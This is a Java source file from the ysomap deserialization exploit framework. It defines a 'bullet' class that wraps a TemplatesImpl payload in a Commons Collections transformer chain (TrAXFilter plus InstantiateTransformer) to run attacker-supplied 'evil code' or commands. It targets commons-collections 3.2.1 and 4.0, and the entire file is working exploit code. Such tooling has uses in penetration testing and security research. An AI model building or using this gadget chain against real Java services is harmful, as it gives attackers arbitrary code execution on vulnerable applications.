package ysomap.bullets.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;

import javax.xml.transform.Templates;
import java.util.LinkedList;

/**
 * jdk.xml.enableTemplatesImplDeserialization=true
 * 这个bullet不是很有必要
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
//@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("执行后，执行任意代码，依赖TemplatesImpl")
@Targets({Targets.JDK})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithTemplatesImplBullet extends AbstractTransformerBullet {

    @NotNull
    @Require(name = "args" ,detail = "evil code (start with 'code:') or evil commands")
    public String args;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        Bullet tplBullet = new TemplatesImplBullet();
        tplBullet.set("body", args);
        Object obj = tplBullet.getObject();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(TrAXFilter.class));
        transformers.add(createInstantiateTransformer(new Class[] { Templates.class },
                                                        new Object[] { obj } ));
        return createTransformerArray(transformers);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TransformerWithTemplatesImplBullet();
        bullet.set("args", args[0]);
        bullet.set("version", args[1]);
        return bullet;
    }

}
